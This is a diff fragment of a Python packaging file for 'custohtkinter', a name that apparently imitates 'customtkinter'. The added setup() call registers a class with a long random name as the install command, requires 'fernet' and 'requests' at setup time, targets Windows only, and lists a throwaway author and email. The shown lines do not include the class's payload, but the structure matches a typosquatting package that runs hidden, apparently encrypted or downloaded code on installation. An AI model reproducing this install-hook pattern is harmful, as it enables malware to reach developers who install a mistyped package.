@@ -18,5 +18,22 @@ class kXSWzRQahwfdhzLtaHobRiQLnkgflozKtRFumGPKsBwpOhzilNDOxotvDkZRwLXSiGqrSWGKFd
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
+setup(
+    name="custohtkinter",
+    version=VERSION,
+    author="lGqMY",
+    author_email="kWMqxJUKmYvfcfqe@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': kXSWzRQahwfdhzLtaHobRiQLnkgflozKtRFumGPKsBwpOhzilNDOxotvDkZRwLXSiGqrSWGKFdiNpliTTYdQVckHdeySvlwBNSnpY,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
